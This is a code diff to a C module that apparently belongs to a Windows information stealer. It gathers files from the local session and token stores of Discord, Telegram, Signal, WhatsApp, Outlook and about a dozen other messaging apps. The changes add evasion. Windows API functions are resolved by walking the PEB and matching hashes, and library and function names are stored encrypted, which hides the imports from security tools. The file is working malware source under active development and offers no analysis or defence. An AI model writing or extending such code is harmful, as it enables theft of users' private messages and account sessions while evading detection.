@@ -1,19 +1,67 @@
+#ifdef TEST_MESSENGERS_STANDALONE
+/* Standalone test mode: expose path construction helpers only, no Windows deps */
+#include "messengers.h"
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void messenger_get_path(char *buf, size_t bufsz, const char *appdata,
+                        const char *subdir) {
+    snprintf(buf, bufsz, "%s\\%s", appdata, subdir);
+}
+
+#else /* Normal build */
+
 #include "messengers.h"
 #include "config.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "enc_strings.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
 #include <windows.h>
 
+/* PEB-walk API resolution for kernel32 file APIs */
+typedef HANDLE (WINAPI *pFindFirstFileA)(const char *, WIN32_FIND_DATAA *);
+typedef BOOL   (WINAPI *pFindNextFileA)(HANDLE, WIN32_FIND_DATAA *);
+typedef BOOL   (WINAPI *pFindClose)(HANDLE);
+
+static struct {
+    pFindFirstFileA pFF;
+    pFindNextFileA  pFN;
+    pFindClose      pFC;
+    int             ready;
+} ms_api;
+
+static int ms_ensure_api(void) {
+    if (ms_api.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32];
+    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
+    ms_api.pFF = (pFindFirstFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
+    ms_api.pFN = (pFindNextFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
+    ms_api.pFC = (pFindClose)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!ms_api.pFF || !ms_api.pFN || !ms_api.pFC) return 0;
+    ms_api.ready = 1;
+    return 1;
+}
+
 // Helper: collect files from a directory
 static MessengerResult collect_dir_files(const char *dir_path) {
+    if (!ms_ensure_api()) { MessengerResult r = {0}; return r; }
     MessengerResult result = {0};
     
     WIN32_FIND_DATAA findData;
     char search_path[1024];
     snprintf(search_path, sizeof(search_path), "%s\\*", dir_path);
     
-    HANDLE hFind = FindFirstFileA(search_path, &findData);
+    HANDLE hFind = ms_api.pFF(search_path, &findData);
     if (hFind == INVALID_HANDLE_VALUE) return result;
     
     size_t count = 0;
@@ -28,11 +76,11 @@ static MessengerResult collect_dir_files(const char *dir_path) {
         char **new_files = realloc(files, (count + 1) * sizeof(char *));
         if (!new_files) break;
         files = new_files;
-        files[count] = strdup(full_path);
+        files[count] = mi_strdup(full_path);
         count++;
-    } while (FindNextFileA(hFind, &findData));
+    } while (ms_api.pFN(hFind, &findData));
     
-    FindClose(hFind);
+    ms_api.pFC(hFind);
     
     result.files = files;
     result.count = count;
@@ -45,7 +93,7 @@ static MessengerResult collect_discord(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\Discord\\Local Storage\\leveldb", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("Discord");
+    r.name = mi_strdup("Discord");
     return r;
 }
 #endif
@@ -56,7 +104,7 @@ static MessengerResult collect_telegram(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\Telegram Desktop\\tdata", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("Telegram");
+    r.name = mi_strdup("Telegram");
     return r;
 }
 #endif
@@ -67,7 +115,7 @@ static MessengerResult collect_signal(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\Signal", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("Signal");
+    r.name = mi_strdup("Signal");
     return r;
 }
 #endif
@@ -78,7 +126,7 @@ static MessengerResult collect_whatsapp(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\WhatsApp", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("WhatsApp");
+    r.name = mi_strdup("WhatsApp");
     return r;
 }
 #endif
@@ -89,7 +137,7 @@ static MessengerResult collect_skype(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\Skype", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("Skype");
+    r.name = mi_strdup("Skype");
     return r;
 }
 #endif
@@ -100,7 +148,7 @@ static MessengerResult collect_viber(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\ViberPC", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("Viber");
+    r.name = mi_strdup("Viber");
     return r;
 }
 #endif
@@ -111,7 +159,7 @@ static MessengerResult collect_element(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\Element", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("Element");
+    r.name = mi_strdup("Element");
     return r;
 }
 #endif
@@ -122,7 +170,7 @@ static MessengerResult collect_session(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\Session", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("Session");
+    r.name = mi_strdup("Session");
     return r;
 }
 #endif
@@ -133,7 +181,7 @@ static MessengerResult collect_tox(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\tox", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("Tox");
+    r.name = mi_strdup("Tox");
     return r;
 }
 #endif
@@ -144,7 +192,7 @@ static MessengerResult collect_icq(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\ICQ", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("ICQ");
+    r.name = mi_strdup("ICQ");
     return r;
 }
 #endif
@@ -155,7 +203,7 @@ static MessengerResult collect_pidgin(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\.purple", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("Pidgin");
+    r.name = mi_strdup("Pidgin");
     return r;
 }
 #endif
@@ -166,7 +214,7 @@ static MessengerResult collect_jabber(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\Psi", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("Jabber");
+    r.name = mi_strdup("Jabber");
     return r;
 }
 #endif
@@ -177,7 +225,7 @@ static MessengerResult collect_outlook(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\Microsoft\\Outlook", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("Outlook");
+    r.name = mi_strdup("Outlook");
     return r;
 }
 #endif
@@ -188,7 +236,7 @@ static MessengerResult collect_microsip(const char *roaming) {
     char path[1024];
     snprintf(path, sizeof(path), "%s\\MicroSIP", roaming);
     MessengerResult r = collect_dir_files(path);
-    r.name = strdup("MicroSIP");
+    r.name = mi_strdup("MicroSIP");
     return r;
 }
 #endif
@@ -295,3 +343,5 @@ void free_messenger_data(MessengerData *data) {
     free_messenger_result(&data->microsip);
 #endif
 }
+
+#endif /* TEST_MESSENGERS_STANDALONE */
